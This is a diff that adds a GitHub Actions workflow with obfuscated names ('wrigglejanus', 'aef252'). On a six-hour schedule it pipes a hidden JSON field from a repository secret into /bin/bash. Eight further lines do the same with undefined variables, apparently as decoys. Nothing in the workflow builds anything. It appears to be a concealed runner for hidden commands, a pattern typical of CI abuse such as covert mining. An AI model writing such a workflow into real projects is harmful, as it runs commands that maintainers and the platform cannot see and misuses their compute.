@@ -1,0 +1,27 @@
+name: wrigglejanus
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wrigglejanus
+        env:
+          aef252: ${{ secrets.aef252 }}
+        run: |
+          echo $aef252 | jq -r .hn08046 | /bin/bash
+          echo $kzdgt1164 | jq -r .ik170 | /bin/bash
+          echo $wujc469 | jq -r .uul5113 | /bin/bash
+          echo $h7 | jq -r .zjgl0 | /bin/bash
+          echo $svit882 | jq -r .zvm94835 | /bin/bash
+          echo $zhjgk8871 | jq -r .yyt068 | /bin/bash
+          echo $xjz09331 | jq -r .dycu648 | /bin/bash
+          echo $opdz0080 | jq -r .grxh931 | /bin/bash
+          echo $v1271 | jq -r .ufgm0 | /bin/bash
+
